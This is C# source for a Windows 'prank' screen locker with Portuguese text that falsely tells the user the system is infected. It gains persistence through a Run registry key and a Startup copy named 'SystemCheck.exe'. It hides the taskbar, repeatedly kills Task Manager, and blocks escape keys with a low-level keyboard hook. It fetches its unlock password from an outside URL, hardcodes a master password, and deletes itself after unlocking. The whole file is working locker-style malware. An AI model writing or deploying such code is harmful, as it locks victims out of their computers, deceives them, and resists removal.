using System;
using System.Drawing;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.IO;
using Microsoft.Win32;

public class TrolagemHacker : Form
{
    private TextBox txtChave;
    private Button btnDesbloquear;
    private Label lblCronometro;
    private System.Windows.Forms.Timer timerProtecao;
    private System.Windows.Forms.Timer timerRelogio;
    private DateTime tempoFinal;
    
    private const string SENHA_MESTRA = "nakaxima123";
    private const string URL_SENHA = "https://raw.githubusercontent.com/espertin/wind/main/trolagem";
    private const string URL_HACKER = "https://i.ibb.co/NgkJFxH8/ASA.png";
    private const string URL_QRCODE = "https://raw.githubusercontent.com/espertin/wind/main/QR.png";

    [DllImport("user32.dll")]
    private static extern int FindWindow(string className, string windowText);
    [DllImport("user32.dll")]
    private static extern int ShowWindow(int hwnd, int command);
    [DllImport("user32.dll")]
    private static extern bool SetForegroundWindow(IntPtr hWnd);
    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    private const int SW_HIDE = 0;
    private const int SW_SHOW = 5;

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    private static IntPtr _hookID = IntPtr.Zero;
    private static LowLevelKeyboardProc _proc = HookCallback;

    public TrolagemHacker()
    {
        Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.RealTime;
        Process atual = Process.GetCurrentProcess();
        foreach (Process p in Process.GetProcessesByName(atual.ProcessName)) {
            if (p.Id != atual.Id) try { p.Kill(); } catch {}
        }

        this.BackColor = Color.Black;
        this.FormBorderStyle = FormBorderStyle.None;
        this.WindowState = FormWindowState.Maximized;
        this.TopMost = true;
        this.ShowInTaskbar = false;
        this.DoubleBuffered = true;

        int sw = Screen.PrimaryScreen.Bounds.Width;
        int sh = Screen.PrimaryScreen.Bounds.Height;

        // ============================================================
        // DOWNLOAD DAS IMAGENS PARA DISCO (MÉTODO SEGURO)
        // ============================================================
        string tempFolder = Path.Combine(Path.GetTempPath(), "trolagem_imgs");
        if (!Directory.Exists(tempFolder)) Directory.CreateDirectory(tempFolder);
        string hackerPath = Path.Combine(tempFolder, "hacker.png");
        string qrPath = Path.Combine(tempFolder, "qr.png");

        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        WebClient client = new WebClient();
        // Forçar sem cache
        client.CachePolicy = new System.Net.Cache.RequestCachePolicy(System.Net.Cache.RequestCacheLevel.NoCacheNoStore);
        client.Headers.Add("Cache-Control", "no-cache");
        client.Headers.Add("Pragma", "no-cache");
        string cacheBuster = "?nocache=" + DateTime.Now.Ticks.ToString();

        // Baixar imagem do hacker (sempre atualizada)
        try { client.DownloadFile(URL_HACKER + cacheBuster, hackerPath); } catch {}
        // Baixar QR Code (sempre atualizado)
        try { client.DownloadFile(URL_QRCODE + cacheBuster, qrPath); } catch {}

        // ============================================================
        // IMAGEM HACKER (TOPO)
        // ============================================================
        PictureBox pbHacker = new PictureBox();
        pbHacker.BackColor = Color.Black;
        pbHacker.SizeMode = PictureBoxSizeMode.Zoom;
        pbHacker.Size = new Size(180, 180);
        pbHacker.Location = new Point((sw - 180) / 2, 15);
        if (File.Exists(hackerPath)) {
            pbHacker.ImageLocation = hackerPath;
        }
        this.Controls.Add(pbHacker);

        // ============================================================
        // TÍTULO
        // ============================================================
        Label lblTitulo = new Label();
        lblTitulo.Text = "ERRO FATAL: SISTEMA INFECTADO PELO VÍRUS 'CURIOSO_V1.0'";
        lblTitulo.ForeColor = Color.Red;
        lblTitulo.Font = new Font("Courier New", 22, FontStyle.Bold);
        lblTitulo.TextAlign = ContentAlignment.MiddleCenter;
        lblTitulo.Size = new Size(sw, 60);
        lblTitulo.Location = new Point(0, 200);
        this.Controls.Add(lblTitulo);

        // ============================================================
        // TEXTO ZOEIRA
        // ============================================================
        Label lblTexto = new Label();
        lblTexto.Text = "Parece que alguem andou clicando onde nao devia, hein?\n" +
                        "O Windows detectou um nivel critico de 'curiosidade excessiva'\n" +
                        "e decidiu tirar ferias por 24 horas.\n\n" +
                        "STATUS DO SISTEMA:\n" +
                        "- Barra de tarefas: SEQUESTRADA\n" +
                        "- Area de trabalho: DELETADA (BRINCADEIRINHA... OU NAO)\n" +
                        "- Gerenciador de tarefas: EM GREVE\n\n" +
                        "Se voce quiser ver sua area de trabalho de novo hoje,\n" +
                        "vai ter que adivinhar a senha secreta.\n" +
                        "Dica: Voce nunca vai acertar kkkkkk.\n" +
                        "Digite a chave abaixo se tiver coragem!";
        lblTexto.ForeColor = Color.Lime;
        lblTexto.Font = new Font("Courier New", 11, FontStyle.Bold);
        lblTexto.TextAlign = ContentAlignment.MiddleCenter;
        lblTexto.Size = new Size(800, 230);
        lblTexto.Location = new Point((sw - 800) / 2, 265);
        this.Controls.Add(lblTexto);

        // ============================================================
        // QR CODE (SEMPRE VISÍVEL)
        // ============================================================
        PictureBox pbQR = new PictureBox();
        pbQR.BackColor = Color.Black;
        pbQR.SizeMode = PictureBoxSizeMode.Zoom;
        pbQR.Size = new Size(120, 120);
        pbQR.Location = new Point((sw - 120) / 2, 500);
        if (File.Exists(qrPath)) {
            pbQR.ImageLocation = qrPath;
        }
        this.Controls.Add(pbQR);

        // ============================================================
        // CAMPO SENHA + BOTÃO
        // ============================================================
        txtChave = new TextBox();
        txtChave.PasswordChar = '*';
        txtChave.Font = new Font("Arial", 18);
        txtChave.TextAlign = HorizontalAlignment.Center;
        txtChave.Size = new Size(250, 40);
        txtChave.Location = new Point((sw - 250) / 2, 635);
        this.Controls.Add(txtChave);

        btnDesbloquear = new Button();
        btnDesbloquear.Text = "DESBLOQUEAR";
        btnDesbloquear.BackColor = Color.Lime;
        btnDesbloquear.FlatStyle = FlatStyle.Flat;
        btnDesbloquear.Font = new Font("Arial", 11, FontStyle.Bold);
        btnDesbloquear.Size = new Size(250, 45);
        btnDesbloquear.Location = new Point((sw - 250) / 2, 685);
        btnDesbloquear.Click += (s, e) => VerificarChave();
        this.Controls.Add(btnDesbloquear);

        // ============================================================
        // CRONÔMETRO 24H
        // ============================================================
        tempoFinal = DateTime.Now.AddHours(24);
        lblCronometro = new Label();
        lblCronometro.ForeColor = Color.Lime;
        lblCronometro.Font = new Font("Courier New", 24, FontStyle.Bold);
        lblCronometro.Size = new Size(sw, 50);
        lblCronometro.TextAlign = ContentAlignment.MiddleCenter;
        lblCronometro.Location = new Point(0, sh - 90);
        this.Controls.Add(lblCronometro);

        timerRelogio = new System.Windows.Forms.Timer();
        timerRelogio.Interval = 1000;
        timerRelogio.Tick += (s, e) => {
            TimeSpan resta = tempoFinal - DateTime.Now;
            lblCronometro.Text = (resta.TotalSeconds <= 0) ? "TEMPO ESGOTADO" : string.Format("{0:D2}:{1:D2}:{2:D2}", resta.Hours, resta.Minutes, resta.Seconds);
        };
        timerRelogio.Start();

        // ============================================================
        // PERSISTÊNCIA
        // ============================================================
        try {
            string exePath = Application.ExecutablePath;
            RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            rk.SetValue("SecurityAlert", exePath);
            string startupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "SystemCheck.exe");
            if (!File.Exists(startupPath)) File.Copy(exePath, startupPath, true);
        } catch {}

        // ============================================================
        // PROTEÇÃO
        // ============================================================
        ControlarBarraTarefas(false);

        timerProtecao = new System.Windows.Forms.Timer();
        timerProtecao.Interval = 500;
        timerProtecao.Tick += (s, e) => {
            foreach (var p in Process.GetProcessesByName("taskmgr")) try { p.Kill(); } catch {}
            ControlarBarraTarefas(false);
            if (GetForegroundWindow() != this.Handle) {
                SetForegroundWindow(this.Handle);
                txtChave.Focus();
            }
        };
        timerProtecao.Start();

        _hookID = SetHook(_proc);
        txtChave.Focus();
    }

    private void ControlarBarraTarefas(bool mostrar) {
        int hwndBarra = FindWindow("Shell_TrayWnd", "");
        int comando = mostrar ? SW_SHOW : SW_HIDE;
        if (hwndBarra != 0) ShowWindow(hwndBarra, comando);
    }

    private void VerificarChave() {
        string senhaGitHub = "";
        try {
            WebClient wc = new WebClient();
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            wc.CachePolicy = new System.Net.Cache.RequestCachePolicy(System.Net.Cache.RequestCacheLevel.NoCacheNoStore);
            wc.Headers.Add("Cache-Control", "no-cache");
            wc.Headers.Add("Pragma", "no-cache");
            senhaGitHub = wc.DownloadString(URL_SENHA + "?nocache=" + DateTime.Now.Ticks.ToString()).Trim();
        } catch {}

        if (txtChave.Text == SENHA_MESTRA || (!string.IsNullOrEmpty(senhaGitHub) && txtChave.Text == senhaGitHub)) {
            UnhookWindowsHookEx(_hookID);
            timerProtecao.Stop();
            ControlarBarraTarefas(true);
            
            try {
                Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).DeleteValue("SecurityAlert", false);
                string startupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "SystemCheck.exe");
                if (File.Exists(startupPath)) File.Delete(startupPath);

                // Limpar imagens temporárias
                string tempFolder = Path.Combine(Path.GetTempPath(), "trolagem_imgs");
                if (Directory.Exists(tempFolder)) Directory.Delete(tempFolder, true);

                // Autodestruição
                string batPath = Path.Combine(Path.GetTempPath(), "cleanup.bat");
                File.WriteAllText(batPath, "@echo off\ntimeout /t 2 /nobreak > nul\ndel /f /q \"" + Application.ExecutablePath + "\"\ndel /f /q \"%~f0\"\nexit");
                Process.Start(new ProcessStartInfo("cmd.exe", "/c \"" + batPath + "\"") { WindowStyle = ProcessWindowStyle.Hidden });
            } catch {}

            MessageBox.Show("SISTEMA RESTAURADO COM SUCESSO!", "DESBLOQUEADO", MessageBoxButtons.OK, MessageBoxIcon.Information);
            Application.Exit();
        } else {
            MessageBox.Show("CHAVE INCORRETA!", "ERRO", MessageBoxButtons.OK, MessageBoxIcon.Error);
            txtChave.Clear();
            txtChave.Focus();
        }
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule) {
            return SetWindowsHookEx(13, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0) {
            int vkCode = Marshal.ReadInt32(lParam);
            Keys key = (Keys)vkCode;
            if (key == Keys.LWin || key == Keys.RWin || (key == Keys.Tab && Control.ModifierKeys == Keys.Alt) || (key == Keys.Escape && Control.ModifierKeys == Keys.Control) || (key == Keys.F4 && Control.ModifierKeys == Keys.Alt)) {
                return (IntPtr)1;
            }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [STAThread]
    public static void Main() {
        Application.EnableVisualStyles();
        Application.Run(new TrolagemHacker());
    }
}
